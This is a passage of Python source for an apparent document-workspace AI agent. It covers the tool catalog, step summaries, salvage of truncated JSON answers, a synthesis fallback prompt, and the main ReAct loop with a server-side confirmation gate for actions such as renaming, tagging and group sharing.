        "a list by hand (you will miscount)."),
    "find_documents": (_t_find_documents,
        "find_documents(query, doc_type, tag, limit) — list the user's documents matching a name/"
        "type/tag substring (empty query = ALL docs). Each returns {id, name, type, DATE, tags}. "
        "Call ONCE with an empty query to sort/group/count across all documents (dates are included) "
        "IN YOUR REASONING — do NOT loop get_field per document to gather dates or types."),
    "search_across": (_t_search_across,
        "search_across(query, top_k) — semantic+keyword search across ALL the user's documents; returns matching passages."),
    "find_by_person": (_t_find_by_person,
        "find_by_person(names=[..], doc_type) — find documents that MENTION a person/organisation by "
        "name (uses the entity graph + extracted fields, not just the filename). Pass 2+ names for the "
        "INTERSECTION (documents mentioning ALL of them). Use for 'documents with/about <Name>', 'of the "
        "X docs how many also mention Y'."),
    "list_entities": (_t_list_entities,
        "list_entities(kind) — list ALL people and/or organisations named across the documents, each "
        "with how many documents they appear in. kind='person'|'org'|'' (both). Use for 'who are all "
        "the people named', 'what companies/organisations appear across my documents'."),
    "document_entity_counts": (_t_document_entity_counts,
        "document_entity_counts(kind) — per document, how many DISTINCT people (or orgs) it names, "
        "sorted most-first. kind='person'|'org'. Use for 'which document mentions the most people'."),
    "get_field": (_t_get_field,
        "get_field(document, field) — read one extracted field (e.g. total, invoice_number) from a named document."),
    "summarize_document": (_t_summarize_document,
        "summarize_document(document) — return the summary + type of a named document."),
    "list_fields": (_t_list_fields,
        "list_fields(document) — list the extracted-field names available on a document (use before extract_table / get_field)."),
    "get_all_fields": (_t_get_all_fields,
        "get_all_fields(document) — ALL extracted fields of ONE document as name→value pairs. Use for "
        "'list every field you extracted from this <doc> as a table' → then render a markdown table."),
    "get_records": (_t_get_records,
        "get_records(document, field) — read a NESTED array field (line_items, transactions, holdings) "
        "as a list of rows. get_field only returns scalars — use THIS for 'list the line items / "
        "transactions'. field='' auto-picks the main array. Render the rows as a markdown table."),
    "compare_documents": (_t_compare_documents,
        "compare_documents(documents=[..], aspects) — gather type+summary+fields for 2+ documents to compare side by side."),
    "extract_table": (_t_extract_table,
        "extract_table(columns=[..], documents=[..] OR doc_type) — build a spreadsheet (one row per document) from extracted fields; a CSV download is attached automatically."),
    "find_duplicates": (_t_find_duplicates,
        "find_duplicates() — find likely duplicate documents (same content hash or same filename)."),
    "export_workspace": (_t_export_workspace,
        "export_workspace(doc_type) — export documents to an .xlsx workbook (a sheet per type); a workbook download is attached automatically. Omit doc_type to export everything."),
    "rename_document": (_t_rename_document,
        "rename_document(document, new_name, confirm) — [ACTION] rename a document."),
    "set_tags": (_t_set_tags,
        "set_tags(document, tags, confirm) — [ACTION] set/replace a document's tags (labels). Use find_documents(tag=…) to retrieve them later."),
    "create_group": (_t_create_group,
        "create_group(name, confirm) — [ACTION] create a new sharing group."),
    "add_to_group": (_t_add_to_group,
        "add_to_group(document, group, confirm) — [ACTION] add a document to a group."),
    "bulk_add_to_group": (_t_bulk_add_to_group,
        "bulk_add_to_group(documents=[..], group, confirm) — [ACTION] add MANY documents to a group in one confirmed step."),
    "reclassify": (_t_reclassify,
        "reclassify(document, confirm) — [ACTION] re-run type detection + field extraction on a document."),
    "sync_drive": (_t_sync_drive,
        "sync_drive(confirm) — [ACTION] pull + process new files from the user's docaiq_docs Drive folder."),
    "final_answer": (None,
        "final_answer(text) — END the loop and give the user the answer."),
}


def _catalog() -> str:
    return "\n".join(f"  · {desc}" for _, (_, desc) in _WS_TOOLS.items())


_TOOL_VERB = {
    "find_documents": "Searched documents", "search_across": "Searched across documents",
    "find_by_person": "Found documents by name", "list_entities": "Listed people/organisations",
    "document_entity_counts": "Counted entities per document",
    "get_field": "Read a field", "summarize_document": "Summarized a document",
    "list_fields": "Listed fields", "get_all_fields": "Read all fields",
    "get_records": "Read records", "compare_documents": "Compared documents",
    "extract_table": "Built a table", "find_duplicates": "Scanned for duplicates",
    "export_workspace": "Built a workbook", "rename_document": "Renamed",
    "set_tags": "Tagged",
    "create_group": "Group", "add_to_group": "Group",
    "bulk_add_to_group": "Group", "reclassify": "Re-extracted", "sync_drive": "Drive sync",
}


def _step_summary(tool: str, obs: dict) -> str:
    """A one-line, human-readable summary of a tool step for the trace UI."""
    verb = _TOOL_VERB.get(tool, tool)
    if isinstance(obs, dict):
        if obs.get("error"):
            return f"{verb} — {obs['error']}"[:160]
        if obs.get("preview"):
            return f"{verb} — awaiting confirmation"
        if obs.get("done"):
            return str(obs["done"])[:160]
        if tool in ("find_documents", "find_by_person"):
            return f"{verb} — {obs.get('count', 0)} match(es)"
        if tool == "search_across":
            return f"{verb} — {len(obs.get('hits') or [])} passage(s)"
        if tool in ("extract_table", "export_workspace"):
            return f"{verb} — {obs.get('count', 0)} row(s)"
        if tool == "find_duplicates":
            return f"{verb} — {obs.get('note', '')}"
        if tool == "compare_documents":
            return f"{verb} — {len(obs.get('compared') or [])} document(s)"
    return verb


def _salvage_final_text(raw: str) -> str:
    """Extract a final_answer's text from a truncated/partial JSON so the user gets the answer,
    not the raw {"tool":"final_answer","args":{"text":"..."}} blob."""
    import re as _re
    if '"text"' not in raw:
        return ""
    m = _re.search(r'"text"\s*:\s*"(.*)', raw, _re.S)
    if not m:
        return ""
    t = m.group(1).rstrip()
    for suf in ('"}}', '"}', '"'):
        if t.endswith(suf):
            t = t[:-len(suf)]
            break
    return (t.replace('\\n', '\n').replace('\\"', '"').replace('\\t', '\t')
             .replace('\\/', '/')).strip()


def _forced_synthesis(db, question: str, history: list[str]) -> str:
    """When the loop runs out of steps (or would leak a raw action JSON), make ONE final LLM call
    that answers the question DIRECTLY from everything already gathered — instead of a canned
    'could not converge'. Turns collected-but-unsynthesised observations into a real answer."""
    from app.services import doc_chat as doc_chat_service
    findings = "\n\n".join(h for h in history if "observation:" in h)[:6000]
    if not findings.strip():
        return ""
    system = (
        "You are DocAIQuest, answering over the user's own documents. Using ONLY the findings gathered "
        "below (tool results from their documents), answer the QUESTION directly and concisely. Quote "
        "exact values and CITE THE SOURCE DOCUMENT for every value in parentheses right after it "
        "(e.g. '$12,340 (0546-Statement.pdf)'). If the findings don't fully answer it, give what IS "
        "known and say briefly what's missing — do NOT say you 'could not converge' or emit JSON. "
        "Never invent data.")
    user = f"QUESTION: {question}\n\nFINDINGS GATHERED FROM THE DOCUMENTS:\n{findings}\n\nAnswer:"
    try:
        return (doc_chat_service.llm_one_shot(db, system, user, max_tokens=1500, cache_system=False) or "").strip()
    except Exception as e:  # noqa: BLE001
        log.warning("forced synthesis failed: %s", e)
        return ""


def run(db: Session, question: str, *, tenant_id: str, prior: list[dict] | None = None) -> dict:
    """Run the workspace ReAct loop. Returns
    {"answer": str, "steps": [..], "artifacts": [..]} — `steps` is a trace the UI
    renders ("what the assistant did"), `artifacts` are downloadables (e.g. CSV).
    `prior` is the recent chat turns so the agent can honor a confirm flow."""
    uid = get_current_owner_user_pk()
    if not uid or uid <= 0:
        return {"answer": "Sign in to use the workspace assistant.", "steps": [], "artifacts": []}
    system = get_prompt("workspace_agent", tool_catalog=_catalog(), max_steps=str(MAX_STEPS))
    from app.services import doc_chat as doc_chat_service
    history = []
    if prior:
        convo = "\n".join(f"  {m.get('role')}: {(m.get('text') or '')[:300]}" for m in prior[-6:])
        history.append("RECENT CONVERSATION (for confirm context):\n" + convo)
    history.append(f"QUESTION: {question}")
    final_text = ""
    steps: list[dict] = []
    artifacts: list[dict] = []
    refs: dict[str, dict] = {}          # docId -> {docId, docName, field?} — answer's sources
    field_by_name: dict[str, str] = {}  # docName -> field the agent read (for citation → field focus)
    retries = PARSE_RETRIES
    for step_idx in range(MAX_STEPS):
        user_block = "\n\n".join(history) + "\n\nReply with the next JSON action now."
        try:
            raw = doc_chat_service.llm_one_shot(db, system, user_block, max_tokens=2000, cache_system=True).strip()
        except Exception as e:  # noqa: BLE001
            log.warning("workspace agent step %d llm failed: %s", step_idx, e)
            break
        parsed = _parse_action(raw)
        if parsed is None:
            if retries > 0:
                retries -= 1
                history.append('PREVIOUS REPLY WAS NOT VALID JSON. Reply with one JSON object only.')
                continue
            # Salvage a final_answer's text from a truncated/partial JSON rather than leaking the
            # raw {"thought":...,"tool":"final_answer","args":{"text":"..."}} to the user.
            final_text = _salvage_final_text(raw) or (raw[:1500] if raw.strip() else "")
            break
        tool = parsed.get("tool") or ""
        args = parsed.get("args") or {}
        if tool == "final_answer":
            final_text = str(args.get("text") or "")
            break
        # Server-side confirm gate: never let an ACTION execute (confirm=true)
        # unless the user actually affirmed a pending preview — downgrade to a
        # preview otherwise, regardless of what the model put in `args`.
        if tool in _ACTION_TOOLS and args.get("confirm") and not _confirm_allowed(question, prior):
            args = {**args, "confirm": False}
            log.info("workspace agent: forced preview for %s (no user confirmation)", tool)
        spec = _WS_TOOLS.get(tool)
        t0 = time.time()
        if spec is None or spec[0] is None:
            obs = {"error": f"unknown tool '{tool}'. Available: {list(_WS_TOOLS)}"}
        else:
            try:
                obs = spec[0](db, tenant_id, uid, **args)
            except TypeError as e:
                obs = {"error": f"bad args for {tool}: {e}"}
            except Exception as e:  # noqa: BLE001
                obs = {"error": f"{tool} failed: {e}"}
                log.warning("workspace tool %s failed: %s", tool, e)
        ms = int((time.time() - t0) * 1000)
        status = ("error" if isinstance(obs, dict) and obs.get("error")
                  else "confirm" if isinstance(obs, dict) and obs.get("preview")
                  else "ok")
        steps.append({"i": step_idx + 1, "tool": tool, "status": status, "ms": ms,
                      "summary": _step_summary(tool, obs)})
        # Collect downloadable artifacts (e.g. the CSV from extract_table) so the
        # download is exact — independent of what the LLM copies into its answer.
        # `has_data` lets us later drop a CSV the agent built with guessed (empty)
        # columns before it called list_fields and re-ran with the right ones.
        if isinstance(obs, dict) and obs.get("csv"):
            rows = obs.get("rows") or []
            has_data = any(str(v).strip() for r in rows for k, v in r.items() if k != "Document")
            artifacts.append({"type": "csv", "content": obs["csv"], "_has_data": has_data})
        if isinstance(obs, dict) and isinstance(obs.get("artifact"), dict):
            artifacts.append(dict(obs["artifact"]))
        # Collect the documents this answer drew on → citations (so the reply links to its sources
        # and can open the exact field). Search hits + FILTERED finds are sources; a whole-inventory
        # find_documents (all docs) is not.
        if isinstance(obs, dict):
            for h in (obs.get("hits") or []):
                did = h.get("docId")
                if did:
                    refs.setdefault(did, {"docId": did, "docName": h.get("document")})
            docs_list = obs.get("documents") or []
            if 0 < len(docs_list) <= 6:
                for d in docs_list:
                    did = d.get("id")
                    if did:
                        refs.setdefault(did, {"docId": did, "docName": d.get("name")})
            if obs.get("document") and obs.get("field") and obs.get("value") not in (None, ""):
                field_by_name[obs["document"]] = obs["field"]
        history.append(
            # find_documents is the aggregation source (sort/group/count over ALL docs) — give it
            # a wide budget so the full list survives; other tools stay compact.
            f"STEP {step_idx} · {tool}({json.dumps(args)[:200]})\n  observation: "
            f"{_render_observation(obs)[:3500 if tool == 'find_documents' else 1000]}"
        )
    # Never leak a raw action/thought JSON blob as the answer (a stalled loop can salvage one).
    if final_text.strip().startswith("{") and ('"thought"' in final_text or '"tool"' in final_text):
        final_text = ""
    if not final_text:
        # Prefer a real synthesised answer from what we gathered over a canned "couldn't converge".
        final_text = _forced_synthesis(db, question, history)
    if not final_text:
        class _S:  # minimal shim for _synthesize_fallback_answer (reads .observation + .action_name)
            def __init__(self, o):
                self.observation = o
                self.action_name = ""
        final_text = _synthesize_fallback_answer(
            [_S(h.split("observation:", 1)[-1]) for h in history if "observation:" in h]
        ) or "I couldn't find that in your documents."
    # Prefer CSVs that actually carry data (drop the agent's empty first guess);
    # if none had data, keep the last so the user still gets *a* download.
    csvs = [a for a in artifacts if a.get("type") == "csv"]
    keep_csv = [a for a in csvs if a.get("_has_data")] or csvs[-1:]
    for a in csvs:
        a.pop("_has_data", None)
    artifacts = [a for a in artifacts if a.get("type") != "csv"] + keep_csv
    for n, a in enumerate(a for a in artifacts if a.get("type") == "csv"):
        a["filename"] = "extract.csv" if n == 0 else f"extract-{n + 1}.csv"
    # attach the field the agent read for each cited doc (→ frontend can pulse that field)
    for c in refs.values():
        f = field_by_name.get(c.get("docName"))
        if f:
            c["field"] = f
    citations = [c for c in refs.values() if c.get("docId")][:6]
    return {"answer": final_text, "steps": steps, "artifacts": artifacts, "citations": citations}
